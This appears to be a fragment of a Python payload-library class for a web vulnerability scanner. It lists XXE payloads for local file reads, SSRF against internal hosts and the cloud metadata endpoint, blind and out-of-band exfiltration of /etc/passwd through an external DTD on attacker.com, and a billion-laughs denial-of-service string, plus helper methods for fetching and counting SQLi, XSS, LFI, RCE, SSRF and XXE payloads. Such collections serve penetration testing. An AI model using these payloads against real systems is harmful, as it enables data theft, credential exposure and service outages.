            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>',
        ],
        "ssrf": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]><foo>&xxe;</foo>',
        ],
        "blind": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?x=test">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % asd SYSTEM "http://attacker.com/xxe.dtd">%asd;%c;]><foo>&rrr;</foo>',
        ],
        "oob": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%send;]>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%send;]><data>4</data>',
        ],
        "dos": [
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
        ]
    }
    
    @classmethod
    def get(cls, vuln_type: str, category: str = "all", dbms: str = "mysql") -> list:
        """获取指定类型的payload"""
        payload_map = {
            "sqli": cls.SQLI, "xss": cls.XSS, "lfi": cls.LFI,
            "rce": cls.RCE, "ssrf": cls.SSRF, "xxe": cls.XXE,
        }
        
        if vuln_type not in payload_map:
            return []
        
        data = payload_map[vuln_type]
        
        # SQL注入按数据库
        if vuln_type == "sqli":
            data = data.get(dbms, data.get("mysql", {}))
        
        if category == "all":
            result = []
            for v in data.values():
                if isinstance(v, list):
                    result.extend(v)
            return result
        
        return data.get(category, [])
    
    @classmethod
    def count(cls) -> dict:
        """统计payload数量"""
        def _count(d):
            total = 0
            for v in d.values():
                if isinstance(v, dict):
                    total += _count(v)
                elif isinstance(v, list):
                    total += len(v)
            return total
        
        return {
            "sqli": _count(cls.SQLI),
            "xss": _count(cls.XSS),
            "lfi": _count(cls.LFI),
            "rce": _count(cls.RCE),
            "ssrf": _count(cls.SSRF),
            "xxe": _count(cls.XXE),
            "total": _count(cls.SQLI) + _count(cls.XSS) + _count(cls.LFI) + 
                     _count(cls.RCE) + _count(cls.SSRF) + _count(cls.XXE)
        }
